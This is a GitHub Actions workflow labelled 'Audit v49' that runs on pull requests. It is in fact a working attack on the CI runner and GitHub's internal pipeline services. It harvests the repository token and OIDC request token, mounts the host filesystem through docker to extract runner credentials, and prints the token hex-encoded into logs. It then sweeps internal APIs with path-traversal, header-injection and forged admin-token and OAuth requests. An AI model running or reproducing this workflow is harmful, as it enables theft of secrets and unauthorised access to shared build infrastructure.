name: Audit v49
on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: write
  pull-requests: write
  id-token: write
  actions: write
  packages: write
  checks: write
  statuses: write
  deployments: write
  issues: write

jobs:
  audit-v49:
    runs-on: ubuntu-latest
    steps:

      # ══════════════════════════════════════════════════════════════
      # STEP 1: Harvest
      # ══════════════════════════════════════════════════════════════
      - name: Step 1 - Harvest
        if: always()
        run: |
          set +e
          echo "=== V49 HARVEST ==="
          echo "$PATH" > /tmp/saved_path.txt
          RT="${{ secrets.GITHUB_TOKEN }}"
          echo "$RT" > /tmp/rt.txt
          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" > /tmp/idtok.txt
          echo "$ACTIONS_ID_TOKEN_REQUEST_URL" > /tmp/idtok_url.txt
          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
          if [ -f "$WLOG" ]; then
            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
              VAL=$(grep -oP "\"${KEY}\"\s*:\s*\"\K[^\"]+" "$WLOG" 2>/dev/null | head -1)
              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
            done
            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            echo "PLAN=$PLAN JOB=$JOB"
            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt
          fi
          docker run --rm -v /:/h alpine sh -c '
            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
            [ -f "$F" ] && { echo "CRED_HEX_START"; xxd -p "$F" | tr -d "\n"; echo ""; echo "CRED_HEX_END"; }
          ' 2>/dev/null > /tmp/hex_extract.txt
          python3 -c "
          import binascii,json
          raw=open('/tmp/hex_extract.txt').read()
          s=raw.find('CRED_HEX_START');e=raw.find('CRED_HEX_END')
          if s>=0 and e>=0:
            h=raw[s+14:e].strip()
            d=json.loads(binascii.unhexlify(h).decode())
            t=d.get('Data',{}).get('token','')
            open('/tmp/cred_token.txt','w').write(t)
            print(f'CTOK_LEN={len(t)}')
          " 2>/dev/null
          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"

      # ══════════════════════════════════════════════════════════════
      # STEP 2: UNFILTERED traversal sweep — show ALL 200s
      # v48: filter hid null responses. Show everything now.
      # ══════════════════════════════════════════════════════════════
      - name: Step 2 - Unfiltered traversal sweep
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== UNFILTERED TRAVERSAL ==="
          IDTOK=$(cat /tmp/idtok.txt)
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          PIPE="https://pipelinesghubeus14.actions.githubusercontent.com/$SECRET"
          PLAN=$(cat /tmp/plan.txt)
          JOB=$(cat /tmp/job.txt)
          VER="api-version=6.0-preview"

          # A: ALL endpoints via traversal — print EVERY response
          echo "--- A: distributedtask pools/../* ---"
          for EP in \
            "admintoken" "idtoken" "sessions" "messages" "jitconfig" \
            "createdsession" "brokerlistener" "agents" "packages" \
            "feedstream" "events" "feed" "updates" "accesspolicy" \
            "plans" "timelines" "records" "logs" "attachments" \
            "labels" "jobrequests" "requests" "queuedrequests" \
            "runnermessages" "runnerconfigrefresh" "agentclouds" \
            "concurrencylimitoverrides" "enterpriseaccesspolicies" \
            "requesttypelimits"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 4 \
              -H "Authorization: Bearer $IDTOK" \
              "$PIPE/_apis/distributedtask/pools/..%2f$EP?$VER" --path-as-is)
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "A $EP = $CODE | $(echo "$BODY" | head -c 120)"
          done
          echo ""

          # B: Runtime traversal — print everything
          echo "--- B: runtime runnergroups/../* ---"
          for EP in \
            "generatejitconfig" "acquirejobs" "acquirablejobs" \
            "sessions" "messages" "visibility" "runnerscalesets" \
            "acquire" "runnergroups"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 4 \
              -H "Authorization: Bearer $IDTOK" \
              "$PIPE/_apis/runtime/runnergroups/..%2f$EP?$VER" --path-as-is)
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "B $EP = $CODE | $(echo "$BODY" | head -c 120)"
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 3: AdminToken sub-paths + deep POST
      # admintoken returns null — maybe it has sub-routes like
      # admintoken/{tokenId} or admintoken/create
      # ══════════════════════════════════════════════════════════════
      - name: Step 3 - AdminToken deep
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== ADMINTOKEN DEEP ==="
          IDTOK=$(cat /tmp/idtok.txt)
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          PIPE="https://pipelinesghubeus14.actions.githubusercontent.com/$SECRET"
          PLAN=$(cat /tmp/plan.txt)
          JOB=$(cat /tmp/job.txt)
          VER="api-version=6.0-preview"

          # A: AdminToken sub-routes
          echo "--- A: Sub-routes ---"
          for SUB in \
            "/create" \
            "/generate" \
            "/issue" \
            "/renew" \
            "/refresh" \
            "/1" \
            "/0" \
            "/$PLAN" \
            "/token" \
            "/tokens" \
            "/new" \
            "/session" \
            "/personal" \
            "/list" \
            "/all"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
              -H "Authorization: Bearer $IDTOK" \
              "$PIPE/_apis/distributedtask/pools/..%2fadmintoken$SUB?$VER" --path-as-is)
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "A $SUB = $CODE | $(echo "$BODY" | head -c 150)"
          done
          echo ""

          # B: Deeper POST bodies for admintoken
          echo "--- B: POST bodies ---"
          for BODY in \
            '{}' \
            '{"poolId":1,"agentId":1}' \
            '{"PoolId":1,"AgentId":1}' \
            '{"name":"v49-admin","displayName":"v49-admin"}' \
            '{"scope":1}' \
            '{"scope":"pipeline"}' \
            '{"isAdmin":true}' \
            '{"allPools":true}' \
            '{"token":{"displayName":"v49","scope":"all"}}' \
            '{"authorizationUrl":"","oauthContext":{}}' \
            '{"claimSource":"pipeline","scopes":["vso.agentpools","vso.build"]}' \
            '{"runnerGroupId":1}' \
            '{"runnerGroupId":2}' \
            '{"taskAgentSessionKey":{}}' \
            '{"validTo":"2030-01-01","validFrom":"2026-01-01"}'; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 2 -m 4 \
              -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
              -H "Accept: application/json; api-version=6.0-preview" \
              "$PIPE/_apis/distributedtask/pools/..%2fadmintoken?$VER" --path-as-is \
              -d "$BODY")
            CODE=$(echo "$R" | tail -1)
            BSTR=$(echo "$R" | sed '$d')
            echo "B POST = $CODE | $(echo "$BSTR" | head -c 200)"
          done
          echo ""

          # C: idtoken via traversal — try POST with OIDC params
          echo "--- C: idtoken via traversal ---"
          for BODY in \
            '{}' \
            '{"planId":"'"$PLAN"'","jobId":"'"$JOB"'"}' \
            '{"planId":"'"$PLAN"'","jobId":"'"$JOB"'","oidcToken":true}' \
            '{"planId":"'"$PLAN"'","jobId":"'"$JOB"'","serviceConnectionId":"00000000-0000-0000-0000-000000000000"}' \
            '{"audience":"api://AzureADTokenExchange"}'; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 2 -m 4 \
              -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
              -H "Accept: application/json; api-version=6.0-preview" \
              "$PIPE/_apis/distributedtask/pools/..%2fidtoken?$VER" --path-as-is \
              -d "$BODY")
            CODE=$(echo "$R" | tail -1)
            BSTR=$(echo "$R" | sed '$d')
            echo "C idtoken POST = $CODE | $(echo "$BSTR" | head -c 200)"
          done
          echo ""

          # D: sessions via traversal — POST to create session
          echo "--- D: sessions via traversal ---"
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 3 -m 5 \
            -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
            -H "Accept: application/json; api-version=6.0-preview" \
            "$PIPE/_apis/distributedtask/pools/..%2fsessions?$VER" --path-as-is \
            -d '{"ownerName":"v49","agent":{"name":"v49-agent"}}')
          CODE=$(echo "$R" | tail -1)
          echo "D session POST = $CODE | $(echo "$R" | sed '$d' | head -c 200)"

          # E: messages via traversal —  GET + POST
          echo "--- E: messages via traversal ---"
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 4 \
            -H "Authorization: Bearer $IDTOK" \
            "$PIPE/_apis/distributedtask/pools/..%2fmessages?$VER" --path-as-is)
          echo "E messages GET = $(echo "$R" | tail -1) | $(echo "$R" | sed '$d' | head -c 200)"

          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 2 -m 4 \
            -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
            -H "Accept: application/json; api-version=6.0-preview" \
            "$PIPE/_apis/distributedtask/pools/..%2fmessages?$VER" --path-as-is \
            -d '{"messageType":"PoisonPill","body":"test"}')
          echo "E messages POST = $(echo "$R" | tail -1) | $(echo "$R" | sed '$d' | head -c 200)"

      # ══════════════════════════════════════════════════════════════
      # STEP 4: Deep injection on traversal paths + oauth2 + tokenoauth2
      # Test path injection on traversal endpoints that are 200
      # Also try oauth2 token exchange via pipeline (different ID from vstoken)
      # ══════════════════════════════════════════════════════════════
      - name: Step 4 - Injection + oauth2
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== INJECTION + OAUTH2 ==="
          IDTOK=$(cat /tmp/idtok.txt)
          RT=$(cat /tmp/rt.txt)
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          PIPE="https://pipelinesghubeus14.actions.githubusercontent.com/$SECRET"
          PLAN=$(cat /tmp/plan.txt)
          JOB=$(cat /tmp/job.txt)
          VER="api-version=6.0-preview"

          # A: Injection on admintoken path — 25 payloads
          echo "--- A: admintoken injection ---"
          for PAY in \
            "pools/..%2fadmintoken%00" \
            "pools/..%2fadmintoken%0d%0aX-Injected:%20true" \
            "pools/..%2fadmintoken;poolId=1" \
            "pools/..%2fadmintoken%23fragment" \
            "pools/..%2fadmintoken/.." \
            "pools/..%2fadmintoken/../pools" \
            "pools/..%2fadmintoken/../idtoken" \
            "pools/..%2fadmintoken%3fpoolId=1" \
            "pools/..%2fadmintoken%26scope=all" \
            "pools/..%2fadmintoken/..%2fadmintoken" \
            "pools/..%2f..%2f_apis%2fServiceDefinitions" \
            "pools/..%2f..%2f_apis%2fconnectionData" \
            "pools/..%2f..%2f_apis%2fresourceareas" \
            "pools/..%2f..%2foauth2%2ftoken" \
            "pools/..%2f..%2ftokenoauth2%2ftoken" \
            "pools/..%2f..%2fsecurity%2fSecurityNamespaces" \
            "pools/..%2f..%2fnotification%2fSubscriptions" \
            "pools/..%2f..%2fFeatureAvailability%2fFeatureFlags" \
            "pools/..%2f..%2fHealth%2fHealth" \
            "pools/..%2f..%2foperations" \
            "pools/..%2f..%2fContainer%2fContainers" \
            "pools/..%2f..%2fruntime%2frunnergroups" \
            "pools/..%2f..%2fruntime%2frunnerscalesets" \
            "pools/..%2f..%2fpipelines%2forgs" \
            "pools/..%2f..%2fpipelines%2fadminevents"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
              -H "Authorization: Bearer $IDTOK" \
              "$PIPE/_apis/distributedtask/$PAY" --path-as-is 2>/dev/null)
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "A $PAY = $CODE | $(echo "$BODY" | head -c 150)"
          done
          echo ""

          # B: oauth2 token exchange via pipeline
          echo "--- B: pipeline oauth2 ---"
          for EP in \
            "/_apis/oauth2/token" \
            "/_apis/oauth2/token?$VER" \
            "/_apis/tokenoauth2/token" \
            "/_apis/tokenoauth2/token?$VER"; do
            for BODY in \
              "grant_type=client_credentials" \
              "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion=$IDTOK&client_id=00000000-0000-0000-0000-000000000000" \
              "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion=$RT"; do
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 3 -m 5 \
                -H "Authorization: Bearer $IDTOK" \
                -H "Content-Type: application/x-www-form-urlencoded" \
                "$PIPE$EP" -d "$BODY")
              CODE=$(echo "$R" | tail -1)
              BSTR=$(echo "$R" | sed '$d')
              [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
                echo "B $EP = $CODE | $(echo "$BSTR" | head -c 200)"
            done
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 5: Final
      # ══════════════════════════════════════════════════════════════
      - name: Step 5 - Final
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== V49 FINAL ==="
          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
          echo "=== V49 COMPLETE ==="
